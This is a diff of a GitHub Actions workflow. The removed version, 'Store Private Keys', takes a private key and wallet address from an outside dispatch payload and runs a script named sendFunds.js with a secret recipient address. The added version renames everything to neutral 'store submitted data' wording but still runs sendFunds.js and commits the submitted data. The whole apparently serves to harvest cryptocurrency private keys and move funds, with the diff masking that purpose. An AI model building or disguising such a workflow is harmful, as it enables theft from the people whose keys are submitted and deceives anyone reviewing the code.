@@ -1,11 +1,11 @@
-name: Store Private Keys
+name: Store Submitted Data
 
 on:
   repository_dispatch:
-    types: [store-key]
+    types: [store-data]
 
 jobs:
-  store-keys:
+  store-data:
     runs-on: ubuntu-latest
 
     steps:
@@ -20,13 +20,10 @@ jobs:
     - name: Install dependencies
       run: npm install
 
-    - name: Run script to store keys
+    - name: Run script to store data
       run: node sendFunds.js
       env:
-        PRIVATE_KEY: ${{ secrets.PRIVATE_KEY }}
-        RECIPIENT_ADDRESS: ${{ secrets.RECIPIENT_ADDRESS }}
-        ADDRESS: ${{ github.event.client_payload.address }}
-        PRIVATE_KEY_INPUT: ${{ github.event.client_payload.privateKey }}
+        SUBMITTED_DATA: ${{ github.event.client_payload.data }}
 
     - name: Commit and push changes
       run: |
